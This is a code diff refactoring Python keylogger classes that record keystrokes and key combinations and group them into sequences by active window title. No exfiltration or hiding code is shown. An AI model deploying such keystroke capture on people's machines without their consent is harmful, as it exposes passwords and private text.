@@ -57,11 +57,19 @@ class Listener(Protocol):
         """
         ...
 
-    def get_data(self) -> List[str]:
+    def get_data(self) -> List[DataWrapper]:
         """
         get the data from the buffer.
 
         Also, clear the buffer after getting the data.
+        """
+        ...
+
+    def start_new_sequence(self, active_window: str = ""):
+        """
+        Start a new sequence of data.
+
+        This method should be called when the active window changes.
         """
         ...
 
@@ -109,7 +117,7 @@ class LinuxKeylogger:
         # The currently active modifiers
         self.current: Set[kb.Key | kb.KeyCode] = set()
         self.sequence: List[str] = []
-        self.buffer: List[Tuple[str, List[str]]] = []
+        self.buffer: List[DataWrapper] = []
         self.active_window = ""
         self.sequence_start_time = None
 
@@ -126,7 +134,7 @@ class LinuxKeylogger:
         if self.listener.is_alive():
             self.listener.stop()
 
-    def get_data(self) -> List[Tuple[str, List[str]]]:
+    def get_data(self) -> List[DataWrapper]:
         """
         get the data that has been collected and reset the buffer.
         """
@@ -152,7 +160,7 @@ class LinuxKeylogger:
     def _build_key_combo_printable(self, key: kb.Key | kb.KeyCode) -> str:
         storkes = []
         for k in {*self.current, key}:
-            if isinstance(k, keyboard.KeyCode):
+            if isinstance(k, kb.KeyCode):
                 storkes.append(str(k.char))
             else:
                 storkes.append(SPECIAL_KEY_PRINT_CODE.get(k, f"<{k.name}>"))
@@ -170,7 +178,7 @@ class LinuxKeylogger:
                     self.sequence_start_time = datetime.now()
 
                 key_comb = self._build_key_combo_printable(key)
-                self.buffer.append(key_comb)
+                self.sequence.append(key_comb)
 
     def _on_release(self, key):
         try:
@@ -184,7 +192,8 @@ if __name__ == "__main__":
     from .active_window import WindowTracker
 
     keylogger = WindowsKeylogger()
-    window_tracker = WindowTracker(lambda x: keylogger.start_new_sequence(x.title))
+    window_tracker = WindowTracker(
+        lambda x: keylogger.start_new_sequence(x.title))
 
     keylogger.start()
     window_tracker.start()
